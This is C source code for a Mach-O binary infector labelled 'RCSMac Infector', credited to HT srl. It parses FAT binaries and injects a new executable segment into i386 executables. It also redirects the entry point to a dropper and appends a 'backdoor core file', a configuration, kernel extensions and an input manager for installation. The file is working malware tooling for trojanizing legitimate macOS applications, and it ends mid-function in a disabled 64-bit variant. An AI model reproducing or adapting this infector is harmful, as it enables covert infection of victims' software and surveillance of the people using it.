/*
 * RCSMac Infector
 *  - Check if the input file is a FAT binary
 *    - If Yes Unpack every single ARCH
 *  - Rebuild a FAT binary with all the original archs and while dealing with the
 *    i386 arch:
 *    - Inject a new LC_SEGMENT right after the __LINKEDIT segment so that we
 *      won't touch __DATA vmaddr (this is because __PAGEZERO will always be 0x1000
 *      big, by default from gcc. One can also specify a different size at compile time)
 *    - Cut sizeof (segment_command) while copying back the _rest_ of the file
 *      (after LC_COMMAND(s)) since we've added a new SEGMENT. In this way we're
 *      gonna cut 0s used for padding and the alignment won't be broken.
 *    - Append our data padded to 0x1000 (Page Boundary) and put our crt start()
 *      routine (standard one created by gcc) as the entryPoint routine which calls
 *      our real main() [secondStageLoader]. There's a problem in having the start
 *      routine different than the one dyld is expecting since it won't initialize
 *      in that case the entire environment memory. See ImageLoaderMachO.cpp:2661
 *      - This must be done in the same architecture and not at the end of the file:
 *        | FAT_HEADER |
 *         | FAT_ARCH i386| <--- change arch size in order to include our files
 *          | ARCH i386 SEGMENTS |
 *          | INJECTED SEGMENT |
 *         | FAT_ARCH OTHER |
 *          | ARCH OTHER SEGMENTS|
 *
 * Created by Alfredo 'revenge' Pesoli on 14/07/2009
 * Win32 porting by Massimo Chiodini on 02/11/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#ifdef __APPLE__
#include <unistd.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/stat.h>
#ifdef __APPLE__
#include <sys/mman.h>
#else
#include <io.h>
#endif

#include "RCSMacCommon.h"
#include "RCSMacInfector.h"
#include "RCSMacDropper.h"

#define INJECTED_SEGMENT  "__INIT_STUBS"
//#define DEBUG
//#define DEBUG_VERBOSE

//extern void dropperStart ();
//extern void labelTest ();
//extern void firstStageDropper ();
//extern void secondStageDropper ();
//extern void dropperEnd ();

//static unsigned int paddedPagezeroVASize = 0;

#define ENTRY_POINT            ((byte *)secondStageDropper - (byte *)dropperStart)
#define DROPPER_CODE_SIZE      ((byte *)dropperEnd - (byte *)dropperStart)
#define FIRST_STAGE_CODE_SIZE  ((byte *)firstStageDropper - (byte *)labelTest)

uint32_t gShiftSize = 0;
uint32_t gOutSize   = 0;


uint32_t getBinaryEP_32 (byte *machoBase)
{
  struct mach_header *m_header;
  struct load_command *l_command;

  unsigned int i;
  unsigned int offset, entryPoint;

  m_header =(struct mach_header *) machoBase;
  offset  = sizeof (struct mach_header);
  
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)((byte *)machoBase + offset);
      
      if (l_command->cmd == LC_THREAD
          || l_command->cmd == LC_UNIXTHREAD)
        {
          struct thread_command *th_command;
          
          th_command = (thread_command *) allocate (sizeof (struct thread_command));
          memcpy (th_command, machoBase + offset, sizeof (struct thread_command));
          
          entryPoint = th_command->state.eip;
          free (th_command);
          
          return entryPoint;
        }
        
      offset += l_command->cmdsize;
    }
  
  return -1;
}
#if 0
uint64_t getBinaryEP_64 (byte *machoBase)
{
  struct mach_header_64 *m_header;
  struct load_command *l_command;

  unsigned int i;
  unsigned int offset;
  uint64_t entryPoint;

  m_header =(struct mach_header_64 *) machoBase;
  offset  = sizeof (struct mach_header_64);
  
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)((byte *)machoBase + offset);
      
      if (l_command->cmd == LC_THREAD
          || l_command->cmd == LC_UNIXTHREAD)
        {
          struct thread_command_64 *th_command;
          
          th_command = (struct thread_command_64 *) allocate (sizeof (struct thread_command_64));
          memcpy (th_command, machoBase + offset, sizeof (struct thread_command_64));
          
          entryPoint = th_command->state.rip;
          free (th_command);
          
          return entryPoint;
        }
        
      offset += l_command->cmdsize;
    }
  
  return -1;
}
#endif
int
setBinaryEP_32 (byte *machoBase, uint32_t anEntryPoint)
{
  struct mach_header *m_header;
  struct load_command *l_command;
  
  unsigned int i;
  unsigned int offset;
  
  m_header = (struct mach_header *) machoBase;
  offset  = sizeof (struct mach_header);
  
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)(machoBase + offset);
      
      if (l_command->cmd == LC_THREAD
          || l_command->cmd == LC_UNIXTHREAD)
        {
#ifdef DEBUG
          printf("Found LC_THREAD for setting ep\n");
#endif
          struct thread_command *th_command;
          
          th_command = (thread_command *) allocate (sizeof (struct thread_command));
          memcpy (th_command, machoBase + offset, sizeof (struct thread_command));
          
          th_command->state.eip = anEntryPoint;
          memcpy (machoBase + offset, th_command, sizeof (struct thread_command));
          free (th_command);  
          
          return 0;
        }
      
      offset += l_command->cmdsize;
    }
  
  return -1;
}
#if 0
int
setBinaryEP_64 (byte *machoBase, uint64_t anEntryPoint)
{
  struct mach_header_64 *m_header;
  struct load_command *l_command;
  
  unsigned int i;
  unsigned int offset;
  
  m_header = (struct mach_header_64 *) machoBase;
  offset  = sizeof (struct mach_header_64);
  
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)(machoBase + offset);
      
      if (l_command->cmd == LC_THREAD
          || l_command->cmd == LC_UNIXTHREAD)
        {
          struct thread_command_64 *th_command;
          
          th_command = (thread_command_64 *) allocate (sizeof (struct thread_command_64));
          memcpy (th_command, machoBase + offset, sizeof (struct thread_command_64));
          
          th_command->state.rip = anEntryPoint;
          memcpy (machoBase + offset, th_command, sizeof (struct thread_command_64));
          free (th_command);  
          
          return 0;
        }
      
      offset += l_command->cmdsize;
    }
  
  return -1;
}
#endif
int appendData (char *inputFilePointer,
                char *outputFilePointer,
                int inArchOffset,
                int outArchOffset,
                int padding,
                uint32_t segmentVMAddr,
                bool is64bitArch)
{
  char *tempFilePointer   = NULL;
  const char *_strings[]  = { "HOME", "%s/%s/%s", "%s/%s", "/%s", "Library", "Preferences", "" };
  
  uint32_t originalEP     = 0;
  int tempFileSize        = 0; 
#ifdef WIN32
  HANDLE tempFD, tempFDMap;
#else
  int tempFD              = 0;
#endif
  int z                   = 0;
  int offset = padding;
    
  infectionHeader infection;
  stringTable     strings;
  resourceHeader  resource;
  
  numberOfResources = 6;
  
  //if (is64bitArch)
  //  originalEP = getBinaryEP_64 ((byte *)(inputFilePointer + inArchOffset));
  //else
  originalEP = getBinaryEP_32 ((byte *)(inputFilePointer + inArchOffset));

#ifdef DEBUG
  printf ("Original EP: %x\n", originalEP);
#endif

  char *coreFileName          = basename(coreFilePath);
  char *confFileName          = basename(confFilePath);
  char *kext32FileName        = basename(kext32FilePath);
  char *kext64FileName        = basename(kext64FilePath);
  char *inputManagerFileName  = basename(inputManagerFilePath);
  char *iconFileName          = basename(iconFilePath);
  char *inputFileName         = basename(inputFilePath);
  char *outputFileName        = basename(outputFilePath);

  //
  // Set the infection header
  //
  memset(&infection, 0, sizeof (infectionHeader));
  infection.numberOfResources = numberOfResources;
  infection.numberOfStrings   = gNumStrings;
  infection.dropperSize       = (int)DROPPER_CODE_SIZE;
  infection.originalEP        = originalEP; //+ paddedPagezeroVASize - PAGE_ALIGNMENT;
  
  memcpy(outputFilePointer + offset, &infection, sizeof (infectionHeader));
  offset += sizeof(infectionHeader);

  //
  // Set the string table
  //
  for (z = 0; z < gNumStrings; z++)
    {
      memset(&strings, 0, sizeof (stringTable));
#ifdef WIN32
      strncpy_s(strings.value, sizeof(strings.value), _strings[z], _TRUNCATE);
#else
      strncpy (strings.value, _strings[z], sizeof (strings.value));
#endif

#ifdef DEBUG_VERBOSE
      printf ("string: %s\n", _strings[z]);
#endif
      strings.type = STRING_DATA;
      
      memcpy(outputFilePointer + offset, &strings, sizeof (stringTable));
      offset += sizeof(stringTable);
    }
  
  // Set the new EP + 4 (number of Resources)
  if (is64bitArch)
    {
#if 0
      if (setBinaryEP_64 ((byte *)(outputFilePointer + outArchOffset),
                          segmentVMAddr
                          + sizeof (infectionHeader)
                          + sizeof (stringTable) * gNumStrings) == -1)
        {
          printf ("[ee] An error occurred while setting the new EP\n");
          exit (1);
        }
#endif
    }
  else
    {
      if (setBinaryEP_32((byte *)(outputFilePointer + outArchOffset),
                         (uint32_t)segmentVMAddr
                          + sizeof (infectionHeader)
                          + sizeof (stringTable) * gNumStrings) == -1)
        {
          printf ("[ee] An error occurred while setting the new EP\n");
          exit (1);
        }
    }
  
  //
  // Now append the crt start routine (__malloc_initialize error fix)
  //
  memcpy(outputFilePointer + offset, crtStart, sizeof (crtStart));
  offset += sizeof (crtStart);
  
  unsigned int ep = (unsigned int)ENTRY_POINT;
#ifdef DEBUG_VERBOSE
  printf ("ep: %x\n", ep);
#endif
  memmove(outputFilePointer + offset - 1, &ep, 3);
  offset += 3;
  
  //
  // Now append our loader
  //
  memcpy(outputFilePointer + offset,
         dropperStart,
         (_mSize_t)DROPPER_CODE_SIZE);
  
  offset += (int)DROPPER_CODE_SIZE;
  
  //
  // Now resourceHeader with all the files which needs to be dropped
  //
  printf("[ii] Dropper injected (%d)\n", (int)DROPPER_CODE_SIZE);
  
  //
  // CORE
  //
  resource.type = RESOURCE_CORE;
  memset(resource.name, 0, strlen(resource.name));
  memcpy(resource.name, coreFileName, sizeof(resource.name));
  
  resource.size = gCoreFileSize;
  
  memset(resource.path, 0, strlen(resource.path));
  memcpy(resource.path, installPath, sizeof(resource.path));
  
  memcpy(outputFilePointer + offset,
         &resource,
         sizeof(resourceHeader));
  
  offset += sizeof(resourceHeader);

#ifdef WIN32
  if ((tempFilePointer = mapFile(coreFilePath, &tempFileSize,
                                 &tempFD, &tempFDMap, 0)) == NULL)

#else
  if ((tempFilePointer = mapFile(coreFilePath, &tempFileSize,
                                 &tempFD, 0)) == NULL)
#endif
    {
      printf("[ee] Error while mmapping the backdoor core file\n");
      exit (1);
    }

  memcpy(outputFilePointer + offset,
         tempFilePointer,
         gCoreFileSize);
  offset += gCoreFileSize;
  
  tempFileSize = 0;

#ifdef WIN32
  if (tempFilePointer != NULL)
	  UnmapViewOfFile(tempFilePointer);

  CloseHandle(tempFDMap);
  CloseHandle(tempFD);
#else
  close (tempFD);
  tempFilePointer = NULL;
#endif

  //
  // CONF
  //
  resource.type = RESOURCE_CONF;
  memset(resource.name, 0, sizeof(resource.name));
  memcpy(resource.name, confFileName, sizeof(resource.name));
  resource.size = gConfFileSize;
  memset(resource.path, 0, sizeof(resource.path));
  memcpy(resource.path, installPath, sizeof(resource.path));
  
  memcpy(outputFilePointer + offset,
         &resource,
         sizeof(resourceHeader));
  
  offset += sizeof(resourceHeader);
#ifdef WIN32
  if ((tempFilePointer = mapFile(confFilePath, &tempFileSize,
                                 &tempFD, &tempFDMap, 0)) == NULL)

#else 
  if ((tempFilePointer = mapFile(confFilePath, &tempFileSize,
                                 &tempFD, 0)) == NULL)
#endif
    {
      printf("[ee] Error while mmapping the configuration file\n");
      exit(1);
    }

  memcpy(outputFilePointer + offset,
         tempFilePointer,
         gConfFileSize);
  offset += gConfFileSize;

  tempFileSize = 0;

#ifdef WIN32
  if(tempFilePointer != NULL)
	  UnmapViewOfFile(tempFilePointer);

  CloseHandle(tempFDMap);
  CloseHandle(tempFD);
#else
  close(tempFD);

  tempFilePointer = NULL;
#endif

  //
  // KEXT32
  //
  resource.type = RESOURCE_KEXT;
  memset(resource.name, 0, sizeof(resource.name));
  memcpy(resource.name, kext32FileName, sizeof(resource.name));
  resource.size = gKext32FileSize;
  memset(resource.path, 0, sizeof(resource.path));
  memcpy(resource.path, installPath, sizeof(resource.path));

#ifdef DEBUG
  printf ("offset: %x\n", offset);
#endif

  memcpy(outputFilePointer + offset,
         &resource,
         sizeof(resourceHeader));
      
  offset += sizeof(resourceHeader);

#ifdef WIN32
	if ((tempFilePointer = mapFile(kext32FilePath, &tempFileSize,
			                  				&tempFD, &tempFDMap, 0)) == NULL)
#else
  if ((tempFilePointer = mapFile(kext32FilePath, &tempFileSize,
                                 &tempFD, 0)) == NULL)
#endif
    {
      printf("[ee] Error while mmapping the configuration file\n");
      exit(1);
    }

  memcpy(outputFilePointer + offset,
         tempFilePointer,
         gKext32FileSize);
      
  offset += gKext32FileSize;
  tempFileSize = 0;

#ifdef WIN32
  if (tempFilePointer != NULL)
    UnmapViewOfFile(tempFilePointer);

  CloseHandle(tempFDMap);
  CloseHandle(tempFD);
#else
  close(tempFD);

  tempFilePointer = NULL;
#endif
  
  //
  // KEXT64
  //
  resource.type = RESOURCE_KEXT;
  memset(resource.name, 0, sizeof(resource.name));
  memcpy(resource.name, kext64FileName, sizeof(resource.name));
  resource.size = gKext64FileSize;
  memset(resource.path, 0, sizeof(resource.path));
  memcpy(resource.path, installPath, sizeof(resource.path));

#ifdef DEBUG
  printf ("offset: %x\n", offset);
#endif

  memcpy(outputFilePointer + offset,
         &resource,
         sizeof (resourceHeader));
      
  offset += sizeof(resourceHeader);

#ifdef WIN32
	if ((tempFilePointer = mapFile (kext64FilePath, &tempFileSize,
			                  					&tempFD, &tempFDMap, 0)) == NULL)
#else
  if ((tempFilePointer = mapFile (kext64FilePath, &tempFileSize,
                                  &tempFD, 0)) == NULL)
#endif
    {
      printf("[ee] Error while mmapping the configuration file\n");
      exit (1);
    }

  memcpy (outputFilePointer + offset,
          tempFilePointer,
          gKext64FileSize);
      
  offset += gKext64FileSize;
  tempFileSize = 0;

#ifdef WIN32
  if (tempFilePointer != NULL)
    UnmapViewOfFile (tempFilePointer);

  CloseHandle (tempFDMap);
  CloseHandle (tempFD);
#else
  close (tempFD);

  tempFilePointer = NULL;
#endif

  //
  // INPUT MANAGER
  //
  resource.type = RESOURCE_IN_MANAGER;
  memset (resource.name, 0, sizeof (resource.name));
  memcpy (resource.name, inputManagerFileName, sizeof (resource.name));
  resource.size = gInputManagerFileSize;
  memset (resource.path, 0, sizeof (resource.path));
  memcpy (resource.path, installPath, sizeof (resource.path));

  memcpy (outputFilePointer + offset,
          &resource,
          sizeof (resourceHeader));

  offset += sizeof (resourceHeader);
#ifdef WIN32
  if ((tempFilePointer = mapFile (inputManagerFilePath, &tempFileSize,
                                  &tempFD, &tempFDMap, 0)) == NULL)
#else 
  if ((tempFilePointer = mapFile (inputManagerFilePath, &tempFileSize,
                                  &tempFD, 0)) == NULL)
#endif
    {
      printf("[ee] Error while mmapping the input manager file\n");
      exit (1);
    }

  memcpy (outputFilePointer + offset,
          tempFilePointer,
          gInputManagerFileSize);

  offset += gInputManagerFileSize;
  tempFileSize = 0;

#ifdef WIN32
  if(tempFilePointer != NULL)
    UnmapViewOfFile(tempFilePointer);

  CloseHandle(tempFDMap);
  CloseHandle(tempFD);
#else
  close (tempFD);
#endif
  
  //
  // ICON
  //
  resource.type = RESOURCE_ICON;
  memset (resource.name, 0, sizeof (resource.name));
  memcpy (resource.name, iconFileName, sizeof (resource.name));
  resource.size = gIconFileSize;
  memset (resource.path, 0, sizeof (resource.path));
  memcpy (resource.path, installPath, sizeof (resource.path));

  memcpy (outputFilePointer + offset,
          &resource,
          sizeof (resourceHeader));

  offset += sizeof (resourceHeader);
#ifdef WIN32
  if ((tempFilePointer = mapFile (iconFilePath, &tempFileSize,
      &tempFD, &tempFDMap, 0)) == NULL)
#else 
  if ((tempFilePointer = mapFile (iconFilePath, &tempFileSize,
      &tempFD, 0)) == NULL)
#endif
    {
      printf("[ee] Error while mmapping the configuration file\n");
      exit (1);
    }

  memcpy (outputFilePointer + offset,
          tempFilePointer,
          gIconFileSize);
  
  offset += gIconFileSize;
  tempFileSize = 0;

#ifdef WIN32
  if(tempFilePointer != NULL)
    UnmapViewOfFile(tempFilePointer);

  CloseHandle(tempFDMap);
  CloseHandle(tempFD);
#else
  close (tempFD);

  tempFilePointer = NULL;
#endif

  return offset;
}

int infectSingleArch (char *inputFilePointer,
                      char *outputFilePointer,
                      int inOffsetToArch,
                      int outOffsetToArch,
                      int inputFileSize,
                      int outputFileSize)
{
  struct mach_header      *m_header;
  struct load_command     *l_command;
  struct segment_command  *seg_command;
  
  unsigned int z;
  unsigned int i;
  unsigned int inputOffset  = 0;
  unsigned int outputOffset = 0;
  unsigned int segVMAddr    = 0;
  int displacement          = 0;
  int padding               = 0;
  
#ifdef DEBUG
  printf("input offset: %d\n", inputOffset);
  printf("inOffsetToArch: %d\n", inOffsetToArch);
  printf("inputFileSize: %d\n", inputFileSize);
#endif

  inputOffset   += inOffsetToArch;
  outputOffset  += outOffsetToArch;
  
  m_header =  (struct mach_header *) allocate (sizeof (struct mach_header));
  memcpy (m_header, inputFilePointer + inputOffset, sizeof (struct mach_header));
  
  // TODO: Add check for cputype as well
  if (m_header->filetype != MH_EXECUTE)
    {
      printf ("[ee] Unsupported file type (!= MH_EXECUTE)\n");
      return kErrorFileNotSupported;
    }
  
  //m_header->sizeofcmds += sizeof (struct section);
  
  // Increment header sizeofcmds since we're adding a new segment
  m_header->sizeofcmds += sizeof (struct segment_command);
  m_header->ncmds      += 1;
  
  memcpy (outputFilePointer + outputOffset, m_header, sizeof (struct mach_header));
  
  // Calculate padding including loader code size
  displacement  = inputFileSize % PAGE_ALIGNMENT;
  padding       = PAGE_ALIGNMENT - displacement;
  
  outputOffset += sizeof (struct mach_header);
  inputOffset  += sizeof (struct mach_header);
#ifdef DEBUG
  printf ("[ii] Starting parsing load_commands\n");
#endif
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)(inputFilePointer + inputOffset);
#ifdef DEBUG_VERBOSE
      printf ("loadCommand: %d (%x)\n", i, l_command->cmd);
#endif
      switch (l_command->cmd)
        {
        case LC_THREAD:
        case LC_UNIXTHREAD:
          {
            struct thread_command *th_command;
            
            th_command = (thread_command *) allocate (sizeof (struct thread_command));
            memcpy (th_command, inputFilePointer + inputOffset, sizeof (struct thread_command));
            
            //th_command->state.eip += sizeof (struct section);
            //th_command->state.eip = 0x8; // W00t
            
            memcpy (outputFilePointer + outputOffset, th_command, sizeof (struct thread_command));
            free (th_command);
            
            inputOffset += sizeof (struct thread_command);
            outputOffset += sizeof (struct thread_command);
            
            break;
          }
        case LC_SEGMENT:
          {
#ifdef DEBUG
            printf ("LC_SEGMENT size: %d\n", (int)(sizeof (struct segment_command)));
#endif
            seg_command = (segment_command *) allocate (sizeof (struct segment_command));
            memcpy (seg_command, inputFilePointer + inputOffset, sizeof (struct segment_command));
            
            inputOffset += sizeof (struct segment_command);
            
            if (!strncmp (seg_command->segname, "__PAGEZERO",
                          strlen (seg_command->segname)))
              {
#ifdef DEBUG
                printf ("[ii] Found __PAGEZERO Segment\n");
#endif  
                //
                // Update the segment within the new prot flags(EP) and size
                //
                //seg_command->cmdsize  += sizeof (struct section);
                /*
                 seg_command->fileoff  = fileSize + padding;
                 
                 //seg_command->filesize = outputFileSize;
                 seg_command->filesize = FIRST_STAGE_CODE_SIZE;
                 
                 if (seg_command->filesize % PAGE_ALIGNMENT)
                 seg_command->filesize = ((seg_command->filesize + PAGE_ALIGNMENT)
                 & ~(PAGE_ALIGNMENT -1));
                 
                 //seg_command->vmsize = paddedPagezeroVASize = outputFileSize; // PageBoundary padding 4K
                 seg_command->vmsize = seg_command->filesize;
                 
                 seg_command->maxprot  = 0x7;
                 seg_command->initprot = 0x5;
                 //seg_command->nsects   += 0x1;
                 */
                // Copy back the segmentCommand
                memcpy (outputFilePointer + outputOffset, seg_command, sizeof (struct segment_command));
                outputOffset += sizeof (struct segment_command);
                /*
                 //
                 // Create the new section
                 //
                 printf ("[ii] section size: %d\n", (int)(sizeof (struct section)));
                 sect = allocate (sizeof (struct section));
                 
                 if (sect == NULL)
                 {
                 printf("[ee] Error while allocating the new section\n");
                 return kErrorMemoryAllocation;
                 }
                 
                 strcpy (sect->sectname, INJECTED_SECTION_NAME);
                 strcpy (sect->segname, INJECTED_SEGMENT_NAME);
                 //sect->addr    = stackSize;
                 sect->offset  = fileSize + padding;
                 sect->size    = outputFileSize; //TOP_STACK - stackSize; // size of the stack
                 sect->align   = 0x2; // standard alignment
                 sect->flags   = 0x80000000; // x flag
                 
                 // Copy back the section
                 memcpy (outputFilePointer + outputOffset, sect, sizeof (struct section));
                 outputOffset += sizeof (struct section);
                 
                 free (sect);
                 */
              }
            else if (!strncmp (seg_command->segname, "__LINKEDIT",
                               strlen (seg_command->segname)))
              {
#ifdef DEBUG
                printf ("[ii] Found %s Segment\n", seg_command->segname);
#endif  
                memcpy (outputFilePointer + outputOffset, seg_command, sizeof (struct segment_command));
                outputOffset += sizeof (struct segment_command);
                
                //
                // Now inject the new segment
                //
                struct segment_command *mySegment = (struct segment_command *) allocate (sizeof (struct segment_command));
                
                mySegment->cmd      = LC_SEGMENT;
                mySegment->cmdsize  = sizeof (struct segment_command);
#ifdef WIN32
				strncpy_s(mySegment->segname, strlen(INJECTED_SEGMENT), INJECTED_SEGMENT, _TRUNCATE);
#else
                strncpy (mySegment->segname, INJECTED_SEGMENT, strlen (INJECTED_SEGMENT));
#endif
                mySegment->vmaddr   = seg_command->vmaddr + seg_command->vmsize;
                mySegment->vmsize   = outputFileSize;
                
                // XXX: Check this out if it's in|out
                mySegment->fileoff  = inputFileSize + padding - outOffsetToArch;

                mySegment->filesize = outputFileSize;
                mySegment->maxprot  = 0x7;
                mySegment->initprot = 0x5;
                
                segVMAddr = mySegment->vmaddr;
#ifdef DEBUG
                printf("Segment VMAddr: %d (0x%08x)\n)", segVMAddr, segVMAddr);
#endif
                memcpy (outputFilePointer + outputOffset, mySegment, sizeof (struct segment_command));
                outputOffset += sizeof (struct segment_command);
              }
            else
              {
                //
                // Shift all the VM Addresses
                //
                //seg_command->vmaddr += paddedPagezeroVASize - PAGE_ALIGNMENT;
                
                memcpy (outputFilePointer + outputOffset,
                        seg_command,
                        sizeof (struct segment_command));
                outputOffset += sizeof (struct segment_command);
#ifdef DEBUG
                printf ("[ii] Cycling for segment (%s) sections (%d)\n",
                        seg_command->segname, seg_command->nsects);
#endif  
                for (z = 0; z < seg_command->nsects; z++)
                  {
                    struct section *sect;
                    
                    sect = (section *) allocate (sizeof (struct section));
                    if (sect == NULL)
                      {
                        printf("[ee] Error while allocating the new section\n");
                        return kErrorMemoryAllocation;
                      }
                    memcpy (sect, inputFilePointer + inputOffset, sizeof (struct section));
                    
                    //sect->offset += sizeof (struct section);
                    //sect->addr += paddedPagezeroVASize - PAGE_ALIGNMENT;
                    
                    memcpy (outputFilePointer + outputOffset,
                            sect,
                            sizeof (struct section));
                    
                    free (sect);
                    inputOffset += sizeof (struct section);
                    outputOffset += sizeof (struct section);
                  }
              }
            
            free (seg_command);
            
            break;
          }
        case LC_SYMTAB:
          {
            struct symtab_command *sy_command;
            sy_command = (symtab_command *) allocate (sizeof (struct symtab_command));
            memcpy (sy_command, inputFilePointer + inputOffset, sizeof (struct symtab_command));
            
            //sy_command->symoff += sizeof (struct section);
            //sy_command->stroff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, sy_command, sizeof (struct symtab_command));
            free (sy_command);
            
            inputOffset += sizeof (struct symtab_command);
            outputOffset += sizeof (struct symtab_command);
            
            break;
          }
        case LC_DYSYMTAB:
          {
            struct dysymtab_command *dysym_command;
            dysym_command = (dysymtab_command *) allocate (sizeof (struct dysymtab_command));
            memcpy (dysym_command, inputFilePointer + inputOffset, sizeof (struct dysymtab_command));
            
            //dysym_command->indirectsymoff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, dysym_command, sizeof (struct dysymtab_command));
            free (dysym_command);
            
            inputOffset += sizeof (struct dysymtab_command);
            outputOffset += sizeof (struct dysymtab_command);
            
            break;
          }
        case LC_CODE_SIGNATURE:
        case LC_SEGMENT_SPLIT_INFO:
          {
            struct linkedit_data_command *linkedit_command;
            linkedit_command = (linkedit_data_command *) allocate (sizeof (struct linkedit_data_command));
            memcpy (linkedit_command, inputFilePointer + inputOffset, sizeof (struct linkedit_data_command));
            
            //linkedit_command->dataoff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, linkedit_command, sizeof (struct linkedit_data_command));
            free (linkedit_command);
            
            inputOffset += sizeof (struct linkedit_data_command);
            outputOffset += sizeof (struct linkedit_data_command);
            
            break;
          }
        default:
          {
            memcpy (outputFilePointer + outputOffset,
                    inputFilePointer + inputOffset,
                    l_command->cmdsize);
            inputOffset += l_command->cmdsize;
            outputOffset += l_command->cmdsize;
            
            break;
          }
        }
    }

#ifdef DEBUG
  printf("[ii] inputFilePointer : 0x%08x\n", inputFilePointer);
  printf("[ii] inputOffset      : 0x%08x\n", inputOffset);
  printf("[ii] inputFileSize    : 0x%08x\n", inputFileSize);
  printf("[ii] outputFilePointer: 0x%08x\n", outputFilePointer);
  printf("[ii] outputOffset     : 0x%08x\n", outputOffset);
  printf("[ii] outputFileSize   : 0x%08x\n", outputFileSize);
  printf("[ii] inOffsetToArch   : 0x%08x\n", inOffsetToArch);
  printf("[ii] outOffsetToArch  : 0x%08x\n", outOffsetToArch);
#endif
  
  //
  // Now the rest of the file (data), here we wanna skip sizeof segment_command
  // in order to leave the file padded correctly for its TEXT segment
  //
  memcpy(outputFilePointer + outputOffset,
         inputFilePointer + inputOffset + sizeof (struct segment_command),
         inputFileSize - (inputOffset - inOffsetToArch) - sizeof (struct segment_command));
  
  free (m_header);
  printf ("[ii] LoadCommands copied successfully\n");
  
#ifdef DEBUG_VERBOSE
  printf ("inputFilePointer: %x\n", inputFilePointer);
  printf ("inputFilePointer: %x\n", *(unsigned long *)inputFilePointer);
  printf ("[ii] inOffsetToArch   : 0x%08x\n", inOffsetToArch);
  printf ("[ii] outOffsetToArch  : 0x%08x\n", outOffsetToArch);
  printf ("inputFilePointer: %x\n", *(unsigned long *)(inputFilePointer + 0x1000));
  printf ("inputSize + padding: %d\n", inputFileSize + padding);
#endif
  
  if (appendData(inputFilePointer,
                 outputFilePointer,
                 inOffsetToArch,
                 outOffsetToArch,
                 inputFileSize + padding,
                 segVMAddr,
                 false) != kErrorGeneric)
    return padding;
  else
    return kErrorGeneric;
}
#if 0
int infectSingleArch64 (char *inputFilePointer,
                        char *outputFilePointer,
                        int inOffsetToArch,
                        int outOffsetToArch,
                        int inputFileSize,
                        int outputFileSize)
{
  struct mach_header_64       *m_header;
  struct load_command         *l_command;
  struct segment_command_64   *seg_command;
  
  unsigned int z;
  unsigned int i;
  uint32_t inputOffset  = 0;
  uint32_t outputOffset = 0;
  uint32_t segVMAddr    = 0;
  int displacement      = 0;
  int padding           = 0;
  
  inputOffset   += inOffsetToArch;
  outputOffset  += outOffsetToArch;
  
  m_header =  (struct mach_header_64 *) allocate (sizeof (struct mach_header_64));
  memcpy(m_header, inputFilePointer + inputOffset, sizeof (struct mach_header_64));
  
  // TODO: Add check for cputype as well
  if (m_header->filetype != MH_EXECUTE)
    {
      printf ("[ee] Unsupported file type (!= MH_EXECUTE)\n");
      return kErrorFileNotSupported;
    }
  
  //m_header->sizeofcmds += sizeof (struct section);
  
  // Increment header sizeofcmds since we're adding a new segment
  m_header->sizeofcmds += sizeof (struct segment_command_64);
  m_header->ncmds      += 1;
  
  memcpy(outputFilePointer + outputOffset, m_header, sizeof (struct mach_header_64));
  
  // Calculate padding including loader code size
  displacement  = inputFileSize % PAGE_ALIGNMENT;
  padding       = PAGE_ALIGNMENT - displacement;
  
  outputOffset += sizeof (struct mach_header_64);
  inputOffset  += sizeof (struct mach_header_64);
#ifdef DEBUG
  printf ("[ii] Starting parsing load_commands\n");
#endif
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)(inputFilePointer + inputOffset);
#ifdef DEBUG_VERBOSE
      printf ("loadCommand: %d (%x)\n", i, l_command->cmd);
#endif
      switch (l_command->cmd)
        {
        case LC_THREAD:
        /*case LC_UNIXTHREAD:
          {
            struct thread_command *th_command;
            
            th_command = (thread_command *) allocate (sizeof (struct thread_command));
            memcpy (th_command, inputFilePointer + inputOffset, sizeof (struct thread_command));
            
            //th_command->state.eip += sizeof (struct section);
            //th_command->state.eip = 0x8; // W00t
            
            memcpy (outputFilePointer + outputOffset, th_command, sizeof (struct thread_command_64));
            free (th_command);
            
            inputOffset += sizeof (struct thread_command);
            outputOffset += sizeof (struct thread_command);
            
            break;
          }*/
        case LC_SEGMENT:
          {
#ifdef DEBUG
            printf ("LC_SEGMENT size: %d\n", (int)(sizeof (struct segment_command_64)));
#endif
            seg_command = (segment_command_64 *) allocate (sizeof (struct segment_command_64));
            memcpy (seg_command, inputFilePointer + inputOffset, sizeof (struct segment_command_64));
            
            inputOffset += sizeof (struct segment_command_64);
            
#ifdef DEBUG_VERBOSE
            printf("segname: %s\n", seg_command->segname);
#endif

            if (!strncmp (seg_command->segname, "__PAGEZERO",
                          strlen (seg_command->segname)))
              {
#ifdef DEBUG
                printf ("[ii] Found __PAGEZERO Segment\n");
#endif  
                //
                // Update the segment within the new prot flags(EP) and size
                //
                //seg_command->cmdsize  += sizeof (struct section);
                /*
                 seg_command->fileoff  = fileSize + padding;
                 
                 //seg_command->filesize = outputFileSize;
                 seg_command->filesize = FIRST_STAGE_CODE_SIZE;
                 
                 if (seg_command->filesize % PAGE_ALIGNMENT)
                 seg_command->filesize = ((seg_command->filesize + PAGE_ALIGNMENT)
                 & ~(PAGE_ALIGNMENT -1));
                 
                 //seg_command->vmsize = paddedPagezeroVASize = outputFileSize; // PageBoundary padding 4K
                 seg_command->vmsize = seg_command->filesize;
                 
                 seg_command->maxprot  = 0x7;
                 seg_command->initprot = 0x5;
                 //seg_command->nsects   += 0x1;
                 */
                // Copy back the segmentCommand
                memcpy (outputFilePointer + outputOffset, seg_command, sizeof (struct segment_command_64));
                outputOffset += sizeof (struct segment_command_64);
                /*
                 //
                 // Create the new section
                 //
                 printf ("[ii] section size: %d\n", (int)(sizeof (struct section)));
                 sect = allocate (sizeof (struct section));
                 
                 if (sect == NULL)
                 {
                 printf("[ee] Error while allocating the new section\n");
                 return kErrorMemoryAllocation;
                 }
                 
                 strcpy (sect->sectname, INJECTED_SECTION_NAME);
